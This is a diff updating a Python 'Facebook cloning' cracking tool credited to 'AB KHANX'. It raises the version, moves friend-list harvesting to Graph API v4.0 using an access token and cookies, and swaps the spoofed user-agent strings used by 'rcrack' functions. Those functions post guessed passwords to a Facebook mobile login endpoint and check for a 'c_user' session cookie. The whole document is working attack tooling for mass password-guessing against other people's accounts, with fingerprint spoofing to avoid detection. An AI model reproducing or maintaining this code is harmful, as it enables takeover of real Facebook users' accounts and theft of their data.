@@ -117,7 +117,7 @@ logo=("""\033[1;32m
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m3.0\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m5.0\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32mPAID\033[1;32m
 --------------------------------------------------
 \033[1;37m[-]KINGX MR SW4T1
@@ -211,7 +211,7 @@ def public():
 	linex()
 	for userr in usrr:
 		try:
-			col = ses.get('https://graph.facebook.com/v3.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			col = ses.get('https://graph.facebook.com/v4.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
 			for mi in col['friends']['data']:
 				try:
 					iso = (mi['id']+'|'+mi['name'])
@@ -770,7 +770,7 @@ def rcrack1(ids,passlist):
 			ffb=random.choice(fbks)
 			dvlk = random.choice(usr)
 			ua=random.choice(ugen)
-			ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/11;;FBDM/'+'{density=3.0,height=360,width=800};]'
+			ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/11;;FBDM/'+'{density=4.0,height=360,width=800};]'
 			li = ['28','29','210']
 			li2 = random.choice(li)
 			j1 = ''.join(random.choice(digits) for _ in range(2))
@@ -858,7 +858,7 @@ def rcrack(ids,passlist):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-M105M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36',}
+            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1',}
 			lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
@@ -912,7 +912,7 @@ def menu_apikey():
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 (+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m3.0\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m5.0\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32mPAID\033[1;32m
 --------------------------------------------------
 \033[1;33m[+]TOOLS  : FACEBOOK CLONING 
